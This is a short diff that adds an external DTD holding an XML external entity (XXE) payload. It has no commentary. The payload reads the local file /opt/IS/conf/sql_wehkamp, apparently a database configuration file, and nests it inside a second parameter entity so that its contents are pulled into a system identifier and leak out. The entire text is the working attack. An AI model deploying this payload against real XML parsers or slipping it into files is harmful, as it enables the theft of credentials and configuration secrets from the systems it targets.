@@ -1,0 +1,4 @@
+<!ENTITY % cfga SYSTEM "file:///opt/IS/conf/sql_wehkamp">
+<!ENTITY % eea "<!ENTITY &#x25; lobsterdata SYSTEM '#%cfga;'>">
+%eea;
+%lobsterdata;
